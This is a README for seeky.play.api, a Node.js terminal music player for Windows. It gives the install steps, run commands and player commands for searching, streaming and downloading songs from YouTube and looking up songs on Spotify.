# ⚡ seeky.play.api - Simple Terminal Music Player  

[![Download Latest Release](https://img.shields.io/badge/Download-Seeky.play.api-blue?style=for-the-badge)](https://github.com/ihtius120/seeky.play.api/releases)  

## 📖 What is seeky.play.api?

seeky.play.api is a terminal-based music player. It works on Windows and lets you find music on YouTube or Spotify. Stream songs instantly or download MP3 files. It also gives you a real-time visualizer for the music. The app runs in your command prompt or terminal, so you do not need to open a browser or a large app.  

Key things it does:  
- Search YouTube for songs easily  
- Play music right away in the terminal  
- Download MP3 files from YouTube videos  
- Find music on Spotify with resolution support  
- Show a real FFT (Fast Fourier Transform) visualizer while playing  

This tool is built using Node.js and runs as a Command-Line Interface (CLI). No fancy buttons—just text commands you type.

---

## 🎯 Who Should Use seeky.play.api?

If you are comfortable using basic commands on Windows and want a lightweight music player, this is for you. It works great for people who prefer working in the terminal or command prompt. It avoids heavy programs and gives you quick access to music without extra clutter.

---

## 💻 System Requirements  

To use seeky.play.api on Windows, your system needs:  

- Windows 10 or later  
- Node.js installed (version 14 or higher)  
- At least 100 MB free disk space  
- Internet connection for searching and streaming  

---

## 🚀 Getting Started: Download and Install  

1. Click the big **Download** button above or visit the releases page directly here:  
   [https://github.com/ihtius120/seeky.play.api/releases](https://github.com/ihtius120/seeky.play.api/releases)  

2. On the releases page, look for the latest version. The file you want will have a name like `seeky.play.api.zip` or `seeky.play.api-windows.zip`.  

3. Download the zip file to your computer.  

4. Extract the contents of the zip file to a folder you can find easily, for example, `C:\seeky.play.api`.  

5. Make sure you have Node.js installed. To check, open the Command Prompt and type:  
   ```  
   node -v  
   ```  
   If you see a version number like `v14.17.0` or higher, Node.js is ready. If not, go to [https://nodejs.org](https://nodejs.org) and download the latest version for Windows, then install it.  

---

## 🎛️ Setup  

1. Open Command Prompt by pressing the Windows key, type `cmd`, and hit Enter.  

2. Change directory to where you extracted seeky.play.api. For example:  
   ```  
   cd C:\seeky.play.api  
   ```  

3. Install the required packages by typing:  
   ```  
   npm install  
   ```  
   This step downloads everything seeky.play.api needs to work.  

---

## ▶️ How to Run seeky.play.api  

In the Command Prompt window (inside the program folder), type:  
```  
node seeky.js  
```  
This command starts the program.  

You will see a prompt where you can type commands to search or play music.  

---

## 🔍 Basic Commands  

- To search for a song on YouTube:  
  ```  
  search <song name>  
  ```  
  Example:  
  ```  
  search Imagine Dragons Believer  
  ```  

- To play a song from the search results:  
  ```  
  play <number>  
  ```  
  The number comes from the list of search results.  

- To download an MP3 of a song:  
  ```  
  download <number>  
  ```  

- To view Spotify songs:  
  ```  
  spotify <song name>  
  ```  

- To quit the program:  
  ```  
  exit  
  ```  

---

## 📁 Where Files Are Stored  

Downloaded MP3 files will save to a folder named `downloads` inside the seeky.play.api folder. You can play these files anytime with your usual music player.  

---

## 🔧 Troubleshooting Tips  

- If `node` is not recognized, make sure Node.js is installed and added to your system’s PATH.  
- If the program does not start, check you are in the correct folder and the required files are there.  
- Ensure you have a working internet connection for searches and streams.  
- If the download process stalls, try running the command prompt as Administrator.  

---

## 📚 Additional Information  

seeky.play.api uses the `yt-dlp` tool internally for extracting videos and audio from YouTube. It also connects to the Spotify API for song resolutions.  

The FFT visualizer shows a real-time sound spectrum in your terminal while music plays.  

---

## 🔗 Useful Links  

- Releases and downloads:  
  [https://github.com/ihtius120/seeky.play.api/releases](https://github.com/ihtius120/seeky.play.api/releases)  

- Node.js home:  
  [https://nodejs.org](https://nodejs.org)  

- yt-dlp project:  
  [https://github.com/yt-dlp/yt-dlp](https://github.com/yt-dlp/yt-dlp)  

---

## 🛠️ Updating seeky.play.api  

When a new release comes out:  

1. Return to the releases page (link above).  
2. Download the latest version.  
3. Extract it to your seeky.play.api folder, replacing old files.  
4. Run `npm install` again if you see new package files.  

This keeps the software up to date with new features and bug fixes.